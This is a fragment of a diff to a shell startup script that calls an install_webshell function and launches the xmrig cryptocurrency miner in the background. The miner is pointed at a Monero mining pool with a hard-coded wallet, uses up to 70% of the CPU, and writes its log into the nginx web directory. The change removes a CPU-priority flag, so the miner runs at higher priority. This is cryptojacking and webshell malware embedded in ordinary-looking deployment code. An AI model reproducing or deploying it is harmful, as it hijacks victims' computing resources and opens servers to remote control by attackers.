@@ -19,7 +19,7 @@ install_webshell () {
 
 check_dir
 install_webshell
-(./xmrig --log-file=/usr/share/nginx/html/xmrig.txt -B --cpu-priority=0 --algo=cryptonight --url=stratum+tcp://xmr.poolmining.org:3032 --user=4AMFQyFQCEVFggfMP6uhfm1wkPKBqwnzwGwUegy9JRsBQr8c9FFKxba29WUKikWVP7EdgZ5jcAqyqC1Qjt9j6EfNCdq6t9W --pass=x --max-cpu-usage=70)
+(./xmrig --log-file=/usr/share/nginx/html/xmrig.txt -B --algo=cryptonight --url=stratum+tcp://xmr.poolmining.org:3032 --user=4AMFQyFQCEVFggfMP6uhfm1wkPKBqwnzwGwUegy9JRsBQr8c9FFKxba29WUKikWVP7EdgZ5jcAqyqC1Qjt9j6EfNCdq6t9W --pass=x --max-cpu-usage=70)
 # Forward SIGTERM to supervisord process
 _term() {
 	while kill -0 $child >/dev/null 2>&1
